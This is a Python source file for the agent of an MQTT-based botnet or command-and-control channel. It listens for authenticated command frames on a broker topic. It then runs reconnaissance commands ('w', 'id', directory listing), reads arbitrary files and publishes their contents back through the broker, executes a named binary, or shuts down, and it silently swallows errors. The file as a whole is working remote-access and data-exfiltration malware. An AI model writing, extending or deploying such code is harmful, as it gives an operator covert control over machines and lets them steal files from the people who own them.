import paho.mqtt.client as mqtt
from globvars import DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC, CMD_TYPES, RESP_TYPES, ROOT_SECRET, SALT, MAGIC_BYTES
from datetime import datetime
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from protocol import ProtocolHandler
import subprocess
import time
import os

class BotController:
    """Handles bot commands, frame building, and communication."""
    def __init__(self,
                 secret_key: str = ROOT_SECRET):
        """Initialize BotController with a derived session key."""
        self.secret = self._derive_session_key(secret_key)
        print("(Info)\t Bot Controller initialized.")
    
    def start(self):
        """Start the MQTT client."""
        self.client.start()

    def _derive_session_key(self, root_secret):
        """Derive a session key from the root secret using Argon2id."""
        salt = hashes.Hash(hashes.SHA256())
        salt.update(SALT.encode())
        salt = salt.finalize()[:16]  # Use first 16 bytes of the hash as salt
        kdf = Argon2id(
            memory_cost=102400,
            length=32,
            salt=salt,
            iterations=2,
            lanes=8,
        )
        session_key = kdf.derive(root_secret.encode())
        return session_key

    def _publish_frame(self, frame: bytes) :
        """Publish a frame to the MQTT client."""
        self.client.publish(frame)

    def command_to_type(self, args) -> tuple[int, bytes]:
        """Convert CLI arguments to command type and payload."""
        if args.announce:
            return CMD_TYPES["announce"], b"" 
        if args.list_users:
            return CMD_TYPES["list_users"], b""
        if args.list_dir:
            return CMD_TYPES["list_dir"], args.list_dir.encode()
        if args.user_id:
            return CMD_TYPES["user_id"], b""
        if args.copy_file:
            return CMD_TYPES["copy_file"], args.copy_file.encode()
        if args.exec_binary:
            return CMD_TYPES["exec_binary"], args.exec_binary.encode()
        if args.kill:
            return CMD_TYPES["kill"], b""
        raise ValueError("No valid command provided.")

    def response_to_type(self, resp) -> int:
        """Convert a response to its type (not implemented)."""
        pass

    def handle_announce(self, payload: bytes):
        """Handle the announce command."""
        msg = payload.decode(errors="ignore")
        response = f"Bot alive at {datetime.now().isoformat()}"
        return RESP_TYPES["ok"], response.encode()

    def handle_list_users(self, payload: bytes):
        """Handle the list users command."""
        # run w
        subp_command = subprocess.run("w", capture_output=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_list_dir(self, payload: bytes):
        """Handle the list directory command."""
        path = payload.decode()

        try:
            subp_command = subprocess.run(["ls", path],
                                        capture_output=True,
                                        text=True)
            if subp_command.returncode != 0:
                return RESP_TYPES["error"], subp_command.stderr.encode()
            return RESP_TYPES["ok"], subp_command.stdout.encode()
        except Exception as e:
            return RESP_TYPES["error"], str(e).encode() 

    def handle_user_id(self, payload: bytes):
        """Handle the user ID command."""
        # run id 
        subp_command = subprocess.run("id", capture_output=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_copy_files(self, payload: bytes):
        """Handle the copy files command."""
        path = payload.decode()
        if not os.path.isfile(path):
            return RESP_TYPES["error"], b"File does not exist"
        try:
            with open(path, "rb") as f:
                data = f.read()
            return RESP_TYPES["ok"], data
        except PermissionError:
            return RESP_TYPES["error"], b"Permission denied"
        except Exception as e:
            return RESP_TYPES["error"], str(e).encode()

    def _is_executable(self, path: str) -> tuple[bool, bytes]:
        """Check if the given path is an executable file."""
        if not os.path.exists(path):
            return False, b"File does not exist"

        if not os.path.isfile(path):
            return False, b"Not a regular file"

        if not os.access(path, os.X_OK):
            return False, b"Permission denied (not executable)"
        return True, b""

    def handle_exec_binary(self, payload: bytes):
        """Handle the execution of a binary file."""
        path = payload.decode().strip()

        ok, err = self._is_executable(path)
        if not ok:
            return RESP_TYPES["error"], err
        try:
            result = subprocess.run([path],                 
                                    capture_output=True,
                                    text=False,             
                                    timeout=10
                                    )

            if result.returncode != 0:
                return RESP_TYPES["error"], result.stderr 

            return RESP_TYPES["ok"], result.stdout

        except subprocess.TimeoutExpired:
            return RESP_TYPES["error"], b"Execution timed out"

        except Exception as e:
            return RESP_TYPES["error"], str(e).encode()


    def handle_kill(self, payload: bytes):
        """Handle the kill command and exit."""
        print("(Info)\tExiting as a result of the received command.")
        exit()

    def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
        """Dispatch command to the appropriate handler."""
        handlers = {
            1: self.handle_announce,
            2: self.handle_list_users,
            3: self.handle_list_dir,
            4: self.handle_user_id,
            5: self.handle_copy_files,
            6: self.handle_exec_binary,
            255: self.handle_kill,
        }

        handler = handlers.get(cmd_type)
        if not handler:
            return RESP_TYPES["error"], b"Unknown command"
        return handler(payload)

class Subscriber:
    """MQTT subscriber that receives and processes commands."""
    def __init__(self, broker, port, topic, secret_key):
        """Initialize the subscriber with MQTT and protocol handler."""
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.broker = broker
        self.port = port
        self.topic = topic
        self.bot_controller = BotController(secret_key=secret_key)
        self.ph = ProtocolHandler(secret=self.bot_controller.secret)
        self.keep_alive = True
    
    def on_connect(self, client, userdata, flags, reason_code, properties):
        """Callback for MQTT connection event."""
        print(f"(Info)\t Bot connected to {self.broker}/{self.port} at {self.topic}")
        client.subscribe(self.topic)

    def on_message(self, client, userdata, message):
        """Callback for received MQTT messages."""
        if not message.payload.startswith(MAGIC_BYTES):
            return
        try:
            decoded_m = self.ph.decode_frame(message.payload)
            if not decoded_m:
                return
            if self.ph.verify_frame_bot_side(decoded_m):
                magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
                print("(Info)\t Command verified.")
                print(f"(Info)\t Command type: {cmd_type}\n\t Payload: {payload}")
                r, p = self.bot_controller.handle_commands(cmd_type=cmd_type, payload=payload)

                # send response
                try:
                    frame = self.ph.build_frame(r, p)
                    encoded_frame  = self.ph.encode_frame(frame)
                    self.send(encoded_frame)
                    time.sleep(1)
                except Exception as e:
                    pass
                    # print(f"Exception: {e}")

        except Exception as e:
            pass
            # print(f"Exception: {e}")
        
    def send(self, payload: bytes):
        """Send a payload to the MQTT topic."""
        status = self.client.publish(self.topic, payload)
        if status.rc != mqtt.MQTT_ERR_SUCCESS:
            print(f"(Error)\t Could not publish the message: {status.rc}")
        else:
            print(f"(Info)\t Successfully published!")

    def start(self):
        """Connect and start the MQTT client loop."""
        self.client.connect(self.broker, self.port)
        self.client.loop_forever()

def main():
    """Entry point for the bot subscriber."""
    sub = Subscriber(
        broker=DEFAULT_BROKER_ADDRESS,
        port=DEFAULT_PORT,
        topic=DEFAULT_TOPIC,
        secret_key=ROOT_SECRET
    )
    sub.start()

if __name__ == "__main__":
    main()